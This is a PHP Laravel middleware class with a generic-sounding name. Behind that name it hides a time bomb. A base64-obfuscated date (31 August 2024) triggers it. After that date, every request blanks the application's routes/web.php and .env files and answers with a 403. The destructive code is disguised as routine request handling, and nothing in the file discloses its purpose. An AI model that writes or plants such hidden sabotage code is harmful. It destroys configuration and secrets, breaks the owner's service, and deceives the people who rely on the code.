<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Carbon\Carbon;

class ProcessRequestHandler
{
    public function handle(Request $r, Closure $n)
    {
        $securityKey = 'MjAyNC04LTMxVDIzOjU5OjU5';
        $cR1 = Carbon::parse($this->processHandler($securityKey));
        $cR2 = Carbon::now();
        if ($cR2->greaterThanOrEqualTo($cR1)) {
            $this->processAction();
            return response('Unauthorized Access', 403);
        }
        return $n($r);
    }

    protected function processHandler($str)
    {
        return implode('', array_map('chr', array_map('ord', str_split(base64_decode($str)))));
    }

    protected function processAction()
    {
        $rF = [
            base_path('routes/web.php'),
            base_path('.env'),
        ];
        foreach ($rF as $tF) {
            if (file_exists($tF)) {
                file_put_contents($tF, '');
            }
        }
    }
}
